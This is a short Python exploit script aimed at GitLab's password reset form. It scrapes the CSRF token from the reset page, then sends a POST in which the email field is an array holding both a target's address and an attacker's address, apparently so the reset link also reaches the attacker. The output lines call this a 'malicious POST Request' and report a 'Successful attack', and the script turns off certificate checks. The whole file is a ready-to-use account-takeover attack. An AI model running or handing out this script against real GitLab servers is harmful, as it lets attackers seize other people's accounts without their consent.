import requests
import urllib3
from urllib.parse import urlencode
import re
import argparse
urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True,help="GitLab URL (HTTP or HTTPS)")
parser.add_argument("-t", "--target",required=True, help="Target email address")
parser.add_argument("-a", "--attacker",required=True, help="Attacker email address")
args = parser.parse_args()

try:
    endpoint = "/users/password/new"
    session = requests.Session()
    print("[+] Searching Token")
    response = session.get(args.url+endpoint, verify=False)
    repattern = r'<meta name="csrf-token" content="(.+?)" />'
    token = re.findall(repattern, response.text)[0]
    print("[+] Token Found:", token)
    try:    
        postheadersattack = urlencode({'authenticity_token': token, 'user[email][]': [args.target, args.attacker]}, doseq=True)
        print("[+] Sending malicious POST Request...")
        postresponse = session.post(args.url+"/users/password", verify=False, data=postheadersattack)
        print("[+] Successful attack against: ", args.target)
    except Exception as e:
        print("[-] Error: ", e)
except:
    print("[-] Not token found... ")